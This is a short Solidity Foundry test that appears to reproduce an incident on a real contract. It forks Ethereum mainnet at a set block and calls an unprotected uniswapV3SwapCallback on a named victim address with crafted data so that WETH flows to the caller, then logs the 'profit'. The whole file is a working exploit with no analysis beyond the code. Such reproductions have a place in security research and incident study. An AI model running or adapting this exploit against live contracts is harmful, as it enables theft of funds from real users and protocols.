// This contract is not certified
import "forge-std/Test.sol";
import "./../interface.sol";

interface IVictime{
    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes memory data) external;

}
contract XXXExploit is Test {

    address victime_ = address(0x452E253EeB3Bb16e40337D647c01b6c910Aa84B3);
    IERC20 weth_ = IERC20(payable(address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)));
    function setUp() public {
        vm.createSelectFork("mainnet", 20223094);
    }

    function testExploit() public {
        bytes memory data = abi.encode(
            bool(true),
            address(weth_)
        );
        IVictime(victime_).uniswapV3SwapCallback(27349000000000000000, 27349000000000000000, data);
        emit log_named_decimal_uint("profit = ", weth_.balanceOf(address(this)), 18);

    }
    receive() external payable {}
}

